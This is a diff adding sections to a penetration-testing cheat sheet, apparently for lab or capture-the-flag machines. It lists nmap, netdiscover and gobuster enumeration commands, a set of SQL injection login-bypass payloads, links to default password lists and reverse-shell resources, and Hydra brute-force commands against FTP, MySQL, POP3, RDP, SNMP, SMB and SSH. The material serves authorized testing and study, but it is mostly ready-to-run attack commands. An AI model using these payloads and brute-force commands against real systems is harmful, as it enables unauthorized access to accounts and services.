@@ -9,6 +9,48 @@ Useful Links:
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md - Reverse shell cheatsheet
 - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php - PHP reverse shell for web servers
 - https://www.abrictosecurity.com/blog/sqlmap-cheatsheet-and-examples/
+- https://explainshell.com/
+
+
+
+ENUMERATION
+
+netdiscover -i eth0  (may be tun0 instead)
+nmap -p- 10.10.10.10  (replace IP with any found IPs)
+nmap -p443,80,53,135,8080 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10  (replace/add any open ports, and save to relevant IP)
+
+While nmap is running the above, open all IPs in browser to see if any web services are running.  If so, run gobuster or dirb on the IP.
+
+gobuster -e -u 'http://10.10.10.10' -w /usr/share/wordlists/<path_to_wordlist_file>.txt
+
+Any login page found, try SQLi manually:
+admin' --
+admin' #
+admin' /*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1-
+
+
+
+Some default password lists:
+http://www.phenoelit.org/dpl/dpl.html
+https://datarecovery.com/rd/default-passwords
+https://github.com/Dormidera/WordList-Compendium
+
+
+Hydra
+hydra -l root -P passwords.txt [-t 32] <IP> ftp
+hydra -L usernames.txt -P pass.txt <IP> mysql
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+hydra -V -f -L usernames.txt -P pass.txt rdp:// <IP>
+hydra -P common-snmp-community-strings.txt target.com snmp
+hydra -l admin -P pass.txt <IP> smb -t 1
+hydra -l root -P pass.txt <IP> ssh
+
+
 
 Linux Priv Esc
   Enumeration
